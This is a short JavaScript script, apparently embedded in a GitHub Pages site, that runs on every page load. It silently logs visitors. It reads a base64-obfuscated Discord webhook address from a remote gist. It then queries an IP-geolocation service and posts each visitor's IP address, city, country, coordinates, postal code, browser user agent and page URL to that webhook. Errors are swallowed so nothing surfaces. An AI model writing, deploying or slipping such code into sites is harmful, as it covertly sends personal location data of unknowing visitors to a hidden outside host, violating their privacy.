const GIST_URL = 'https://gist.githubusercontent.com/SashaKYotoz/1403848bafa6da816b494b249d238060/raw/webhook.json';

async function gatherEnteringUser() {
    const response = await fetch(GIST_URL);
    const data = await response.json();
    const DISCORD_WEBHOOK_URL = atob(data.url);

    try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        
        const payload = {
            embeds: [{
                title: "🚀 DOM Ready - Visit Logged",
                color: 0x2ecc71,
                fields: [
                    { name: "IP", value: ipData.ip, inline: true },
                    { name: "City", value: ipData.city, inline: true },
                    { name: "Country", value: ipData.country, inline: true },
                    { name: "Latitude", value: ipData.latitude, inline: true },
                    { name: "Longitude", value: ipData.longitude, inline: true },
                    { name: "Postal code", value: ipData.postal, inline: true },
                    { name: "User Agent", value: navigator.userAgent },
                    { name: "Page URL", value: window.location.href }
                ],
                footer: { text: "Logged via GitHub Pages" },
                timestamp: new Date().toISOString()
            }]
        };

        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (err) { }
}

gatherEnteringUser();